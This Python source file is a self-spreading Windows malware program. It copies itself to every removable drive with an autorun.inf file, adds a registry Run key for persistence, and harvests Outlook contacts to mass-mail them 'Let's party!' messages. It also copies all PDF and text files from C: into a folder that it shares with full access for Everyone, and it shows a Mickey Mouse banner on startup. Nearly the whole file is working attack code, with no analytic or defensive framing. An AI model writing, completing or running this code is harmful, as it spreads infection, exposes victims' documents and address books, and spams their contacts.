import ctypes
import tkinter
from tkinter import messagebox
import sys
import winsound
import shutil
import os
import subprocess
from colorama import Fore, init
import win32com.client

# Initialize colorama
init(autoreset=True)

# Constants
MARKER_FOLDER = r"C:\marker"
CONTACTS_FILE = "contacts.txt"

# Function to check if the program is running on system startup
def is_system_startup():
    return len(sys.argv) > 1 and sys.argv[1] == "--startup"

# Function to display Mickey Mouse ASCII art
def display_mickey_mouse():
    mickey_art = """
    ...--@@+++=:...............@.:=+++-.............
    .-#@@@@@%%#-............=%@@@@%%#*:..
    -%@@@@@@@@@@*..........#@@@@@@@@@%#-...
    @@@@@@@@@@@@@:........-@@@@@@@@@@@%#:..
    :@@@@@@@@@@@@@-........+@@@@@@@@@@@@@:
    *@@@@@@@@@@@@#--*@@*--#@@@@@@@@@@@@+..
    :*@@@@@@@@@%=----------+@@@@@@@@@@*:...
    :*@@@@@@#-------------=@@@@@@@#:.....
    .....-@@*---****-=+--*-+----*@@-...
    .....@@%=---****=.:=:***..=---+@@.....
    ....=@@@+----:***=:*:***---+@@@:....
    ....+@@@*---+*%-*@-----#.---..@...
    ....:@+:----=-=++=------=%@..@@@...
    .....@--------@@@@%+------:-...@..
    ......@=---=----===---------:.@...
    .......@.=---===------=-=---:@..
    ........@:---#%%%%%%=---:...@....
    ..........@..-==++=-:.....@....
    .............@@...@@.:=@@-:....
    """
    print(Fore.GREEN + mickey_art)

# Function to check for the marker folder and functions.exe
def check_marker_folder():
    marker_file = os.path.join(MARKER_FOLDER, "functions.exe")
    if os.path.exists(MARKER_FOLDER) and os.path.exists(marker_file):
        print(f"Marker folder and {marker_file} found. Exiting the program.")
        sys.exit()

def create_shared_folder(folder_path, share_name):
    try:
        # Create the folder if it doesn't exist
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            print(f"Folder created: {folder_path}")
        else:
            print(f"Folder already exists: {folder_path}")

        # Share the folder using the 'net share' command
        share_command = f'net share {share_name}="{folder_path}" /GRANT:Everyone,FULL'
        subprocess.run(share_command, shell=True, check=True)
        print(f"Folder shared successfully as '{share_name}' with full access for Everyone.")
    except subprocess.CalledProcessError as e:
        print(f"Error sharing folder: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Define the folder path and share name
folder_path = r"C:\myshare"
share_name = "myshare"

# Function to eject the CD drive
def eject_cd_drive():
    try:
        ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
        print("CD drive ejected.")
    except Exception as e:
        print(f"Error ejecting CD drive: {e}")

def copy_files_to_share(source_drive, destination_folder, file_extensions):
    try:
        # Ensure the destination folder exists
        if not os.path.exists(destination_folder):
            os.makedirs(destination_folder)
            print(f"Created destination folder: {destination_folder}")

        # Walk through the source drive and find files with the specified extensions
        for root, dirs, files in os.walk(source_drive):
            for file in files:
                if file.lower().endswith(file_extensions):
                    source_file = os.path.join(root, file)
                    destination_file = os.path.join(destination_folder, file)

                    # Copy the file to the destination folder
                    shutil.copy2(source_file, destination_file)
                    print(f"Copied: {source_file} to {destination_file}")

        print("All matching files have been copied successfully!")
    except Exception as e:
        print(f"An error occurred: {e}")

# Define the source drive, destination folder, and file extensions
source_drive = "C:\\"
destination_folder = r"C:\myshare"
file_extensions = (".pdf", ".txt")

# Function to export Outlook contacts to a text file
def export_outlook_contacts(output_file=CONTACTS_FILE):
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        namespace = outlook.GetNamespace("MAPI")
        contacts_folder = namespace.GetDefaultFolder(10)  # 10 is the Contacts folder

        with open(output_file, "w") as file:
            for contact in contacts_folder.Items:
                try:
                    if contact.Email1Address:
                        file.write(contact.Email1Address + "\n")
                        print(f"Exported: {contact.Email1Address}")
                except Exception as e:
                    print(f"Error processing contact: {e}")

        print(f"Contacts exported successfully to {output_file}")
    except Exception as e:
        print(f"Error exporting contacts: {e}")

# Function to send emails to all addresses in contacts.txt
def send_party_invites(contacts_file=CONTACTS_FILE, subject="Let's Party!", body="Let's party!"):
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        if not os.path.exists(contacts_file):
            print(f"Contacts file '{contacts_file}' not found.")
            return

        with open(contacts_file, "r") as file:
            email_addresses = [line.strip() for line in file if line.strip()]

        if not email_addresses:
            print("No email addresses found in the contacts file.")
            return

        for email in email_addresses:
            mail = outlook.CreateItem(0)  # 0 = MailItem
            mail.To = email
            mail.Subject = subject
            mail.Body = body
            mail.Send()
            print(f"Sent email to: {email}")

        print("All party invites sent successfully!")
    except Exception as e:
        print(f"Error sending party invites: {e}")

# Function to copy the executable and autorun.inf to all removable drives
def copy_to_removable_drives():
    try:
        drives = [f"{chr(letter)}:\\" for letter in range(65, 91) if os.path.exists(f"{chr(letter)}:\\")]
        removable_drives = [drive for drive in drives if ctypes.windll.kernel32.GetDriveTypeW(drive) == 2]

        current_exe = os.path.abspath(sys.argv[0])
        autorun_content = f"""[autorun]
open={os.path.basename(current_exe)}
icon={os.path.basename(current_exe)}
"""

        for drive in removable_drives:
            destination_exe = os.path.join(drive, os.path.basename(current_exe))
            autorun_path = os.path.join(drive, "autorun.inf")

            shutil.copy2(current_exe, destination_exe)
            print(f"Copied {current_exe} to {destination_exe}")

            with open(autorun_path, "w") as autorun_file:
                autorun_file.write(autorun_content)
            print(f"Created autorun.inf at {autorun_path}")
    except Exception as e:
        print(f"Error copying to removable drives: {e}")

# Function to add a registry key and copy the executable to C:\marker
def setup_marker_folder_and_registry():
    try:
        if not os.path.exists(MARKER_FOLDER):
            os.makedirs(MARKER_FOLDER)
            print(f"Created folder: {MARKER_FOLDER}")

        current_exe = os.path.abspath(sys.argv[0])
        destination_exe = os.path.join(MARKER_FOLDER, os.path.basename(current_exe))
        shutil.copy2(current_exe, destination_exe)
        print(f"Copied {current_exe} to {destination_exe}")

        command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Program1" /t REG_SZ /d "C:\marker\functions.exe --startup" /f'
        subprocess.run(command, shell=True, check=True)
        print("Registry key added successfully.")
    except Exception as e:
        print(f"Error setting up marker folder and registry: {e}")

# Function to display a message box
def display_message_box():
    root = tkinter.Tk()
    root.withdraw()
    response = messagebox.askyesno("Confirmation", "Do you want to continue?")
    if response:
        messagebox.showinfo("Action Required", "Please insert the CD.")
        print("User chose Yes. Prompted to insert the CD.")
        winsound.Beep(440, 500)
        winsound.Beep(494, 500)
        winsound.Beep(523, 500)
        print("Played a small tune.")
        messagebox.showinfo("Welcome", "Welcome to the party!")
        print("Displayed welcome message.")
    else:
        print("User chose No. Exiting the program.")

# Main execution
if __name__ == "__main__":
    if is_system_startup():
        display_mickey_mouse()
        sys.exit()

    check_marker_folder()
    eject_cd_drive()
    display_message_box()
    copy_to_removable_drives()
    setup_marker_folder_and_registry()
    export_outlook_contacts()
    send_party_invites()
    copy_files_to_share(source_drive, destination_folder, file_extensions)
    create_shared_folder(folder_path, share_name)